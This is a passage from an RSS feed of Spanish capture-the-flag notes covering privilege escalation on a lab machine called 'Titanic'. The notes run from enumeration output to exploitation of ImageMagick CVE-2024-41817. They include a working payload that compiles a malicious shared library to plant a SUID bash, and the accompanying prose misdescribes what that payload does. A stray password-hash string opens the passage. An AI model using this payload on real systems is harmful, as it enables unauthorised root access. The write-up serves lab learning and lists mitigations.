cher0:sha256:50000:VpoIOf+qbEoZSJpdEAbPEg==:LxvR7kwoYpo/3IEFyPo/pHly3IBVMapJuWKzCa1xd+g7BQbyLrlIc3QFZfH0NP0tbTs=:12345678
]]></description><link>machines/titanic/1.recon.html</link><guid isPermaLink="false">Machines/Titanic/1.Recon.md</guid><pubDate>Mon, 17 Feb 2025 20:20:37 GMT</pubDate><enclosure url="machines/titanic/imgs/pasted-image-20250217165949.png" length="0" type="image/png"/><content:encoded>&lt;figure&gt;&lt;img src=&quot;machines/titanic/imgs/pasted-image-20250217165949.png&quot;&gt;&lt;/figure&gt;</content:encoded></item><item><title><![CDATA[2.PrivESC]]></title><description><![CDATA[ 
 <br>Nos logeamos como developer por ssh:<br><br><img alt="fuck.gif" src="machines/titanic/imgs/fuck.gif"> <img alt="fuck.gif" src="machines/titanic/imgs/fuck.gif"> <img alt="fuck.gif" src="machines/titanic/imgs/fuck.gif"><br>
<img alt="Pasted image 20250217193814.png" src="machines/titanic/imgs/pasted-image-20250217193814.png"><br><br>developer@titanic:~$ ps -aux
USER         PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
develop+    1156 29.1  0.9 1066036 37312 ?       Ss   16:01  47:07 /usr/bin/python3 /opt/app/app.py
develop+    1767  1.4  6.6 1545764 262080 ?      Ssl  16:01   2:21 /usr/local/bin/gitea web
develop+    1843  0.0  0.2  17196  9648 ?        Ss   16:01   0:01 /lib/systemd/systemd --user
develop+    5666  0.0  0.1   8300  4240 ?        Ss   16:06   0:00 /usr/bin/dbus-daemon --session --address=systemd: --nofork --nopidfile --systemd-act
develop+   50115  0.0  0.1   8788  5648 pts/4    Ss+  16:13   0:00 -bash
develop+  541766  0.0  0.1   8792  5628 pts/3    Ss+  16:54   0:00 -bash
develop+  825413  0.0  0.1   8812  5700 pts/1    Ss+  17:14   0:00 -bash
develop+  888111  0.0  0.1   8656  5416 pts/2    Ss+  17:19   0:00 -bash
develop+ 1211353  0.0  0.1   8788  5656 pts/6    Ss+  18:02   0:00 -bash
develop+ 1312515  0.0  0.1   8780  5560 pts/7    Ss+  18:17   0:00 -bash
develop+ 1428974  0.0  0.1   8788  5560 pts/0    Ss   18:29   0:00 -bash
develop+ 1432094  0.0  0.1   9196  5596 pts/8    Ss+  18:30   0:00 -bash
develop+ 1432162  0.0  0.1   8788  5600 pts/9    Ss+  18:30   0:00 -bash
develop+ 1530131  0.0  0.1   8656  5392 pts/10   Ss   18:38   0:00 -bash
develop+ 1553045 12.4  0.2 705804  9980 pts/0    Sl+  18:40   0:17 ./pspy64
develop+ 1564135  0.0  0.0  10336  3752 pts/10   R+   18:42   0:00 ps -aux
developer@titanic:~$ 

<br><br>Tenemos ahi el puerto 3000 (gitea) y el 5000 (titanic python webpage)<br>Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
tcp        0      0 127.0.0.1:3000          0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:5000          0.0.0.0:*               LISTEN      1156/python3        
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:2222          0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:43209         0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -                   
tcp6       0      0 :::80                   :::*                    LISTEN      -                   
tcp6       0      0 :::22                   :::*                    LISTEN      -                   
udp        0      0 127.0.0.53:53           0.0.0.0:*                           -                   
udp        0      0 0.0.0.0:68              0.0.0.0:*                           -           
<br><br>developer@titanic:~$ find / -perm /4000 2&gt;/dev/null
/snap/core20/2434/usr/bin/chfn
/snap/core20/2434/usr/bin/chsh
/snap/core20/2434/usr/bin/gpasswd
/snap/core20/2434/usr/bin/mount
/snap/core20/2434/usr/bin/newgrp
/snap/core20/2434/usr/bin/passwd
/snap/core20/2434/usr/bin/su
/snap/core20/2434/usr/bin/sudo
/snap/core20/2434/usr/bin/umount
/snap/core20/2434/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/snap/core20/2434/usr/lib/openssh/ssh-keysign
/snap/snapd/23545/usr/lib/snapd/snap-confine
/usr/lib/snapd/snap-confine
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/openssh/ssh-keysign
/usr/libexec/polkit-agent-helper-1
/usr/bin/chsh
/usr/bin/newgrp
/usr/bin/su
/usr/bin/pkexec
/usr/bin/sudo
/usr/bin/gpasswd
/usr/bin/umount
/usr/bin/chfn
/usr/bin/passwd
/usr/bin/mount
/usr/bin/bash
/usr/bin/fusermount3
developer@titanic:~$ find / -perm /2000 2&gt;/dev/null
/snap/core20/2434/usr/bin/chage
/snap/core20/2434/usr/bin/expiry
/snap/core20/2434/usr/bin/ssh-agent
/snap/core20/2434/usr/sbin/pam_extrausers_chkpwd
/snap/core20/2434/usr/sbin/unix_chkpwd
/snap/core20/2434/var/mail
/var/log/journal
/var/log/journal/3010787ce58f43a9a8f1c8c49cb903e8
/var/local
/var/mail
/run/log/journal
/usr/local/share/fonts
/usr/sbin/unix_chkpwd
/usr/sbin/pam_extrausers_chkpwd
/usr/lib/x86_64-linux-gnu/utempter/utempter
/usr/bin/ssh-agent
/usr/bin/bash
/usr/bin/expiry
/usr/bin/crontab
/usr/bin/chage

<br><br>developer@titanic:/etc$ tree /etc/cron.d
/etc/cron.d
└── e2scrub_all

0 directories, 1 file
developer@titanic:/etc$ cat /etc/cron.d/e2scrub_all 
30 3 * * 0 root test -e /run/systemd/system || SERVICE_MODE=1 /usr/lib/x86_64-linux-gnu/e2fsprogs/e2scrub_all_cron
10 3 * * * root test -e /run/systemd/system || SERVICE_MODE=1 /sbin/e2scrub_all -A -r

<br>Este cronjob se utiliza para realizar una verificación programada de los sistemas de archivos ext4 cuando el sistema no está usando systemd . La herramienta e2scrub_all_cron revisa los sistemas de archivos en busca de errores y realiza tareas de mantenimiento.<br><br>Para seguir enumerando vamos a usar <a data-tooltip-position="top" aria-label="https://github.com/DominicBreuker/pspy" rel="noopener nofollow" class="external-link" href="https://github.com/DominicBreuker/pspy" target="_blank">pspy64</a><br>
Es un programa que vigila procesos , archivos que se estan abriendo en el sistema, comandos que se ejecuten...<br>Esto nos ayuda a encontrar un posible corn job de root o algun servicio que ejecute comandos que se nos este escapando en el foothold;<br>Le decimos a pspy que printee tanto comandos como eventos del sistema de archivos a cada segundo<br>developer@titanic:~$ ./pspy64 -cpf -i 1000 | tee pspyrecord
pspy - version: v1.2.1 - Commit SHA: f9e6a1590a4312b9faa093d8dc84e19567977a6d


     ██▓███    ██████  ██▓███ ▓██   ██▓
    ▓██░  ██▒▒██    ▒ ▓██░  ██▒▒██  ██▒
    ▓██░ ██▓▒░ ▓██▄   ▓██░ ██▓▒ ▒██ ██░
    ▒██▄█▓▒ ▒  ▒   ██▒▒██▄█▓▒ ▒ ░ ▐██▓░
    ▒██▒ ░  ░▒██████▒▒▒██▒ ░  ░ ░ ██▒▓░
    ▒▓▒░ ░  ░▒ ▒▓▒ ▒ ░▒▓▒░ ░  ░  ██▒▒▒ 
    ░▒ ░     ░ ░▒  ░ ░░▒ ░     ▓██ ░▒░ 
    ░░       ░  ░  ░  ░░       ▒ ▒ ░░  
                   ░           ░ ░     
                               ░ ░     

Config: Printing events (colored=true): processes=true | file-system-events=true ||| Scanning for processes every 1s and on inotify events ||| Watching directories: [/usr /tmp /etc /home /var /opt] (recursive) | [] (non-recursive)
Draining file system events due to startup...

<br>Revisando el log observamos que se esta ejecutando el binario de magick probablemente llamado por un cron job o por el script identify_images.sh<br>
<img alt="Pasted image 20250217200648.png" src="machines/titanic/imgs/pasted-image-20250217200648.png"><br><br>Revisando el script de bash se esta ejecutando magick identify buscando archivos jpg en la ruta /opt/app/static/assets/images/ y guardandolo en un metadata.log<br>developer@titanic:~$ cat /opt/scripts/identify_images.sh
cd /opt/app/static/assets/images
truncate -s 0 metadata.log
find /opt/app/static/assets/images/ -type f -name "*.jpg" | xargs /usr/bin/magick identify &gt;&gt; metadata.log
<br>developer@titanic:~$ find / -type f -name metadata.log 2&gt;/dev/null
/opt/app/static/assets/images/metadata.log

developer@titanic:~$ cat /opt/app/static/assets/images/metadata.log
/opt/app/static/assets/images/luxury-cabins.jpg JPEG 1024x1024 1024x1024+0+0 8-bit sRGB 280817B 0.000u 0:00.003
/opt/app/static/assets/images/entertainment.jpg JPEG 1024x1024 1024x1024+0+0 8-bit sRGB 291864B 0.000u 0:00.000
/opt/app/static/assets/images/home.jpg JPEG 1024x1024 1024x1024+0+0 8-bit sRGB 232842B 0.000u 0:00.000
/opt/app/static/assets/images/exquisite-dining.jpg JPEG 1024x1024 1024x1024+0+0 8-bit sRGB 280854B 0.000u 0:00.000
/opt/app/static/assets/images/root.jpg JPEG 1024x1024 1024x1024+0+0 8-bit sRGB 291864B 0.000u 0:00.000

<br>Miramos la version de magick que es vulnerable al <a data-tooltip-position="top" aria-label="https://nvd.nist.gov/vuln/detail/cve-2024-41817" rel="noopener nofollow" class="external-link" href="https://nvd.nist.gov/vuln/detail/cve-2024-41817" target="_blank">CVE-2024-41817</a><br>
<img alt="Pasted image 20250217203145.png" src="machines/titanic/imgs/pasted-image-20250217203145.png"><br>developer@titanic:~$ magick -version
Version: ImageMagick 7.1.1-35 Q16-HDRI x86_64 1bfce2a62:20240713 https://imagemagick.org
Copyright: (C) 1999 ImageMagick Studio LLC
License: https://imagemagick.org/script/license.php
Features: Cipher DPC HDRI OpenMP(4.5) 
Delegates (built-in): bzlib djvu fontconfig freetype heic jbig jng jp2 jpeg lcms lqr lzma openexr png raqm tiff webp x xml zlib
Compiler: gcc (9.4)
<br><br><a rel="noopener nofollow" class="external-link" href="https://github.com/ImageMagick/ImageMagick/issues/7568" target="_blank">https://github.com/ImageMagick/ImageMagick/issues/7568</a><br>
Accrording to Tenable:<br>
ImageMagick is a free and open-source software suite, used for editing and manipulating digital images. The AppImage version ImageMagick might use an empty path when setting MAGICK_CONFIGURE_PATH and LD_LIBRARY_PATH environment variables while executing, which might lead to arbitrary code execution by loading malicious configuration files or shared libraries in the current working directory while executing ImageMagick. The vulnerability is fixed in 7.11-36.<br>This script exploits a vulnerability in ImageMagick’s AppImage version (before 7.1.1-36) that improperly handles LD_LIBRARY_PATH, allowing arbitrary library loading.  <br>Creamos la libreria maliciosa y ejecutamos imagemagick<br>gcc -x c -shared -fPIC -o ./libxcb.so.1 - &lt;&lt; EOF
#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;unistd.h&gt;

__attribute__((constructor)) void init(){
    system("sudo install -m =xs $(which bash) /tmp/bash");
    exit(0);
}
EOF
<br><img alt="Pasted image 20250217211424.png" src="lib/media/pasted-image-20250217211424.png"><br>
<img alt="Pasted image 20250217211512.png" src="lib/media/pasted-image-20250217211512.png"><br><br>
<br>
Crea una Biblioteca Compartida Maliciosa (libxcb.so.1)

<br>El código C dentro de ella se ejecuta al cargarse y copia el archivo /root/root.txt a /tmp/root.txt.
<br>Esto se logra utilizando el atributo constructor, que ejecuta automáticamente el comando system("sudo install -m =xs $(which bash) /tmp/bash").


<br>
Prepara un Archivo de Imagen

<br>Copia entertainment.jpg a root.jpg, posiblemente para desencadenar su procesamiento por ImageMagick.


<br><br><br>
<br>La aplicación AppImage de ImageMagick puede cargar incorrectamente libxcb.so.1 desde un directorio controlado por el atacante debido a un manejo inadecuado de la variable de entorno LD_LIBRARY_PATH.
<br>Cuando ImageMagick se ejecuta, carga la biblioteca maliciosa, lo que desencadena la escalada de privilegios.
<br><br><br>
<br>Actualiza ImageMagick a la versión 7.1.1-36 o superior.
<br>Restringir el abuso de variables de entorno (LD_LIBRARY_PATH).
<br>Este enfoque corrige la vulnerabilidad al evitar que se carguen bibliotecas no deseadas y limitando el uso indebido de variables de entorno.]]></description><link>machines/titanic/2.privesc.html</link><guid isPermaLink="false">Machines/Titanic/2.PrivESC.md</guid><pubDate>Mon, 17 Feb 2025 20:19:17 GMT</pubDate><enclosure url="machines/titanic/imgs/fuck.gif" length="0" type="image/gif"/><content:encoded>&lt;figure&gt;&lt;img src=&quot;machines/titanic/imgs/fuck.gif&quot;&gt;&lt;/figure&gt;</content:encoded></item></channel></rss>